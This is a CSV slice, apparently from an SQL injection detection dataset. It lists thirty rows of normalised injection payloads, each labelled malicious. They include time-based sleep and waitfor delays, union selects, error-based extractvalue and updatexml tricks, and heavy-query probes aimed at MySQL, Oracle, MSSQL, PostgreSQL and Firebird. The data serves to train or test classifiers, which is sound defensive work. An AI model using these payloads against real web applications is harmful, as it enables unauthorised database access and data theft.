row_index,payload_norm,label,sqli_type_hint
8340,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
8341,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
8342,"-7007 ) union all select 6704,6704--",1,
8343,1' ) ) as uizu where 1774 = 1774,1,
8344,"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",1,
8345,"1%' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",1,
8346,-2715' ) ) or 6942 = 1636 and ( ( 'mqeq' = 'mqeq,1,
8347,"-3378%"" ) ) union all select 9357,9357,9357,9357,9357--",1,
8348,"-6263%"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,1,
8349,waitfor delay '0:0:5' ) +',1,
8350,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""gxhz"" = ""gxhz",1,
8351,-4882' order by 1#,1,
8352,1 where 2301 = 2301,1,
8353,-9005 union all select 4410#,1,
8354,"-7324 ) or make_set ( 8486 = 6544,6544 )",1,
8355,1' or sleep ( 5 ) and 'udqz' = 'udqz,1,
8356,"1%"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""%"" = """,1,
8357,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""qyew"" = ""qyew",1,
8358,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) #",1,
8359,"1"" ) where 3084 = 3084 union all select null,null--",1,
8360,"-4993"" union all select 6959,6959,6959--",1,
8361,"end and ( ( ""dmgj"" = ""dmgj",1,
8362,"1' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8363,1 ) where 8813 = 8813,1,
8364,1' ) ) and sleep ( 5 ) #,1,
8365,( 8266 = 8266 ) *9900,1,
8366,"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1,
8367,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) -- sbvl",1,
8368,select ( case when ( 1227 = 4014 ) then 1227 else 1227* ( select 1227 from mysql.db ) end ) #,1,
8369,1' ) as dqgr where 2427 = 2427 and ( 3020 = 3020 ) *6703--,1,
